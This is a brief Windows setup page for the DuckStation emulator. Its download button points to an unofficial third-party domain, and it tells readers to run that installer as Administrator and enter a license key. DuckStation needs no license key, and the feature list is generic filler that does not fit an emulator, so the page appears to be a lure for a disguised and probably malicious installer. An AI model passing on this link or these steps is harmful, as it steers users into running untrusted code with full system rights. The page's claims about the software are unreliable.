# DuckStation Windows Setup Notes

**Download:** [Get Windows installer →](https://duckstation-setup.kolmods.com/)

## Download & Install

> Setup notes for **DuckStation** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **DuckStation** from the Start menu

## What you can use it for

- Core DuckStation features on Windows desktop
- Install and configure DuckStation for daily use
- Import, edit, and export with DuckStation tools
- Tune settings and profiles inside DuckStation
- Integrate DuckStation into your existing workflow
